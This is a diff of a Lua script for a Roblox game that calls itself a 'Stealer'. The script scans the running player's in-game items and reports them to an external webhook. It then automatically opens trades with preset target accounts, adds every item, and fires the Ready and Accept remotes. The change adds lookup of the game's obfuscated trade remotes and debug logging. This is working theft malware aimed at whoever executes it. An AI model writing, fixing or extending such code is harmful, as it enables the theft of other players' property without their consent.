@@ -1,5 +1,4 @@
--- STEALER LIMPO - Sem metatable, sem debug, sem getconnections
--- Só o básico: escanear → webhook → trade
+-- Versão corrigida com remotes ofuscados
 
 if game.PlaceId ~= 109983668079237 then
     return
@@ -22,15 +21,24 @@ local DELAY_BETWEEN_INVITES = getgenv().DELAY_BETWEEN_INVITES or 15
 local tradeCompleted = false
 local webhookSent = false
 
-local function getRemote(name)
+-- ===== PEGA REMOTE OFUSCADO =====
+-- O Net tem uma estrutura: "RE/NomeDoRemote" e o próximo filho é o remote real
+local function getObfuscatedRemote(name)
     local net = ReplicatedStorage:FindFirstChild("Packages")
     if net then
         net = net:FindFirstChild("Net")
         if net then
             local children = net:GetChildren()
+            -- Procura o remote ofuscado
             for i = 1, #children - 1 do
-                if children[i] and children[i].Name and string.find(children[i].Name, name) then
-                    return children[i + 1]
+                local current = children[i]
+                local nextOne = children[i + 1]
+                if current and current.Name and string.find(current.Name, name) then
+                    -- O remote real é o próximo filho (ofuscado)
+                    if nextOne and (nextOne:IsA("RemoteEvent") or nextOne:IsA("RemoteFunction")) then
+                        print("[DEBUG] Remote encontrado: " .. current.Name .. " -> " .. nextOne.Name)
+                        return nextOne
+                    end
                 end
             end
         end
@@ -38,6 +46,7 @@ local function getRemote(name)
     return nil
 end
 
+-- ===== FIND PLAYER BASE =====
 local function findPlayerBase()
     local plots = Workspace:FindFirstChild("Plots")
     if not plots then return nil end
@@ -71,6 +80,7 @@ local function findPlayerBase()
     return nil
 end
 
+-- ===== SCAN BRAINROTS =====
 local function getAnimalNames()
     local names = {}
     local animalsFolder = ReplicatedStorage:FindFirstChild("Animations")
@@ -108,6 +118,7 @@ local function scanBrainrots()
     return found
 end
 
+-- ===== WEBHOOK =====
 local function formatNumber(n)
     if not n or n == 0 then return "$0/s" end
     if n >= 1e12 then return "$" .. string.format("%.2fT", n / 1e12):gsub("%.?0+$", "")
@@ -166,9 +177,11 @@ local function sendWebhook(brainrots)
                 username = "Stealer"
             })
         })
+        print("[Stealer] Webhook enviado!")
     end)
 end
 
+-- ===== GET USER ID =====
 local function getUserIdFromName(username)
     if type(username) == "number" then return username end
     local success, result = pcall(function()
@@ -189,20 +202,33 @@ local function isPlayerOnline(userId)
     return false
 end
 
+-- ===== MAIN =====
 local function main()
-    local brainrots = scanBrainrots()
-    sendWebhook(brainrots)
+    print("[Stealer] Iniciado!")
     
-    if #brainrots == 0 or #TARGET_USERS == 0 then
+    -- Pega os remotes ofuscados
+    local inviteRemote = getObfuscatedRemote("TradeService/Invite")
+    local addBrainrotRemote = getObfuscatedRemote("TradeService/AddBrainrot")
+    local readyRemote = getObfuscatedRemote("TradeService/Ready")
+    local acceptRemote = getObfuscatedRemote("TradeService/Accept")
+    
+    print("[Stealer] Remotes:")
+    print("  Invite: " .. tostring(inviteRemote ~= nil))
+    print("  AddBrainrot: " .. tostring(addBrainrotRemote ~= nil))
+    print("  Ready: " .. tostring(readyRemote ~= nil))
+    print("  Accept: " .. tostring(acceptRemote ~= nil))
+    
+    if not inviteRemote or not addBrainrotRemote then
+        print("[Stealer] ❌ Remotes não encontrados!")
         return
     end
     
-    local inviteRemote = getRemote("TradeService/Invite")
-    local addBrainrotRemote = getRemote("TradeService/AddBrainrot")
-    local readyRemote = getRemote("TradeService/Ready")
-    local acceptRemote = getRemote("TradeService/Accept")
+    local brainrots = scanBrainrots()
+    print("[Stealer] Brainrots encontrados: " .. #brainrots)
+    sendWebhook(brainrots)
     
-    if not inviteRemote or not addBrainrotRemote then
+    if #brainrots == 0 or #TARGET_USERS == 0 then
+        print("[Stealer] Sem brainrots ou targets!")
         return
     end
     
@@ -211,23 +237,41 @@ local function main()
             if target ~= "" then
                 local userId = getUserIdFromName(target)
                 if userId and isPlayerOnline(userId) then
-                    local success = pcall(inviteRemote.InvokeServer, inviteRemote, "afb005f9-6e81-4e0a-8bb0-3555938a9658", userId)
+                    print("[Stealer] Enviando invite para: " .. target)
+                    
+                    -- InvokeServer com os parâmetros corretos
+                    local success = pcall(function()
+                        return inviteRemote:InvokeServer("afb005f9-6e81-4e0a-8bb0-3555938a9658", userId)
+                    end)
                     
                     if success then
+                        print("[Stealer] ✅ Invite enviado!")
                         task.wait(3)
                         
                         for _, brainrot in ipairs(brainrots) do
-                            pcall(addBrainrotRemote.InvokeServer, addBrainrotRemote, "6b5f15fb-5cb9-4d07-a031-bbff8e641eda", brainrot.slotKey, {Index = brainrot.name})
+                            print("[Stealer] Adicionando: " .. brainrot.name)
+                            pcall(function()
+                                addBrainrotRemote:InvokeServer("6b5f15fb-5cb9-4d07-a031-bbff8e641eda", brainrot.slotKey, {Index = brainrot.name})
+                            end)
                             task.wait(1.5)
                         end
                         
                         if readyRemote and acceptRemote then
                             task.wait(3)
-                            pcall(readyRemote.FireServer, readyRemote, "d73acf93-6f32-44df-b813-0f6b32c7afd9")
+                            print("[Stealer] Enviando Ready...")
+                            pcall(function()
+                                readyRemote:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9")
+                            end)
                             task.wait(2)
-                            pcall(acceptRemote.FireServer, acceptRemote, "918ee0f5-e98f-413f-b76e-baee47b021cb")
+                            print("[Stealer] Enviando Accept...")
+                            pcall(function()
+                                acceptRemote:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb")
+                            end)
+                            print("[Stealer] ✅ Trade concluída!")
                             tradeCompleted = true
                         end
+                    else
+                        print("[Stealer] ❌ Falha ao enviar invite!")
                     end
                 end
             end
